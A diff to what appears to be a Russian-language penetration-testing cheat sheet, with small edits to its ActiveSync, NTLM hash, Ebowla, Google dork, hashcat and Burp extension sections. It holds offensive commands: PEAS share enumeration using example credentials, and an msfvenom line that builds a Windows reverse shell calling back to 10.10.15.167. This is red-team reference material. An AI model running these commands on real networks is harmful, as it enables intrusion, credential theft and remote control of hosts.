@@ -799,12 +799,14 @@ PS > (Get-ADDomain -Server $DomainName).NetBIOSName
 ### ActiveSync
 
 
-#### PEAS:
+#### PEAS
+
+* [Accessing Internal Fileshares through Exchange ActiveSync](https://labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/)
 
 Install:
 
 ```
-$ git clone https://github.com/FSecureLABS/peas && cd
+$ git clone https://github.com/FSecureLABS/peas ~/tools/peas && cd ~/tools/peas
 $ python -m virtualenv --python=/usr/bin/python venv && source venv/bin/activate
 $ pip install requests twisted pyOpenSSL lxml service_identity
 ```
@@ -812,11 +814,11 @@ $ pip install requests twisted pyOpenSSL lxml service_identity
 Run:
 
 ```
-$ python -m peas --check -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.ru
-$ python -m peas --list-unc='\\DC2' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.ru
-$ python -m peas --list-unc='\\DC2\SYSVOL' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.ru
-$ python -m peas --list-unc='\\DC2\SYSVOL\corp.ru' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.ru
-$ python -m peas --list-unc='\\DC2\NETLOGON' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.ru
+$ python -m peas --check -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.local
+$ python -m peas --list-unc='\\DC02' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.local
+$ python -m peas --list-unc='\\DC02\SYSVOL' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.local
+$ python -m peas --list-unc='\\DC02\SYSVOL\corp.local' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.local
+$ python -m peas --list-unc='\\DC02\NETLOGON' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.local
 ```
 
 
@@ -845,7 +847,7 @@ $ pypykatz lsa minidump lsass.dmp
 `[SMB] NTLMv1 Hash` and `[SMB] NTLMv1-SSP Hash` capture structure:
 
 ```
-`<Username>:<Domain>:<LMv1_Response>:<NTv1_Response>:<Server_Challenge>`
+<Username>:<Domain>:<LMv1_Response>:<NTv1_Response>:<Server_Challenge>
 ```
 
 `[SMB] NTLMv2-SSP Hash` capture structure:
@@ -988,7 +990,7 @@ PS > cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xm
 ### Ebowla
 
 ```
-$ sudo git clone https://github.com/Genetic-Malware/Ebowla ~/tools/Ebowla && cd ~/tools/Ebowla
+$ git clone https://github.com/Genetic-Malware/Ebowla ~/tools/Ebowla && cd ~/tools/Ebowla
 $ sudo apt install golang mingw-w64 wine -y
 $ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
 $ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
@@ -1459,6 +1461,7 @@ root@kali:$ vi ~/.msf4/modules/exploits/linux/http/p.rb
 site:example.com filetype:(doc | docx | docm | xls | xlsx | xlsm | ppt | pptx | pptm | pdf | rtf | odt | xml | txt)
 site:example.com ext:(config | cfg | ini | log | bak | backup | dat)
 site:example.com ext:(php | asp | aspx)
+"@example.com" email e-mail
 ```
 
 
@@ -2085,7 +2088,7 @@ root@kali:$ ./hashcat64.exe -m 0 -b
 root@kali:$ ./hashcat64.exe -m 1000 -b
 ```
 
-| Единица Хэшрейта  |           Хэшрейт             | Хэши в секунду  |
+| Единица хэшрейта  |           Хэшрейт             | Хэши в секунду  |
 |-------------------|-------------------------------|-----------------|
 | 1kH/s             |                          1000 | Тысяча          |
 | 1MH/s             |                       1000000 | Одинмиллион     |
@@ -3899,6 +3902,7 @@ BApp Store:
 * [github.com/portswigger/active-scan-plus-plus](https://github.com/portswigger/active-scan-plus-plus)
 * [github.com/portswigger/add-custom-header](https://github.com/portswigger/add-custom-header)
 * [github.com/portswigger/backslash-powered-scanner](https://github.com/portswigger/backslash-powered-scanner)
+* [github.com/portswigger/collaborator-everywhere](https://github.com/portswigger/collaborator-everywhere)
 * [github.com/portswigger/freddy-deserialization-bug-finder](https://github.com/portswigger/freddy-deserialization-bug-finder)
 * [github.com/portswigger/j2ee-scan](https://github.com/portswigger/j2ee-scan)
 * [github.com/portswigger/json-beautifier](https://github.com/portswigger/json-beautifier)
